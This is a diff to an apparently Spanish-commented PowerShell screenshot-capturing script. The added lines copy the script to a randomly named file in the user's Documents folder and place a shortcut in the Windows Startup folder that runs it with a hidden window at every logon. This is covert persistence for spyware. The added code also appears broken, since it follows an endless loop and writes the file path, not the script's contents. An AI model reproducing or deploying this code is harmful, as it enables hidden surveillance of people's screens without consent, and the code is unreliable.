@@ -47,3 +47,29 @@ While ($true){
     # Esperar el intervalo de tiempo especificado antes de tomar las próximas capturas de pantalla
     Start-Sleep -Seconds $seconds
 }
+
+# Obtener la carpeta de documentos del usuario actual
+$documentsFolder = [Environment]::GetFolderPath("MyDocuments")
+
+# Generar un nombre aleatorio para el archivo de script
+$randomFileName = [System.IO.Path]::GetRandomFileName() + ".ps1"
+
+# Ruta completa del archivo de script en la carpeta de documentos
+$scriptPath = Join-Path -Path $documentsFolder -ChildPath $randomFileName
+
+# Guardar el script en la carpeta de documentos
+Set-Content -Path $scriptPath -Value $ExecutionContext.SessionState.InvokeCommand.ExpandString(($MyInvocation.MyCommand.ScriptBlock).File)
+
+# Crear una carpeta de inicio si no existe
+$startupFolder = Join-Path -Path $env:APPDATA -ChildPath "Microsoft\Windows\Start Menu\Programs\Startup"
+if (-not (Test-Path -Path $startupFolder)) {
+    New-Item -Path $startupFolder -ItemType Directory -Force | Out-Null
+}
+
+# Crear un acceso directo del script en la carpeta de inicio para que se ejecute al iniciar Windows
+$shortcutPath = Join-Path -Path $startupFolder -ChildPath "$randomFileName.lnk"
+$shell = New-Object -ComObject WScript.Shell
+$shortcut = $shell.CreateShortcut($shortcutPath)
+$shortcut.TargetPath = "powershell.exe"
+$shortcut.Arguments = "-WindowStyle Hidden -File `"$scriptPath`""
+$shortcut.Save()
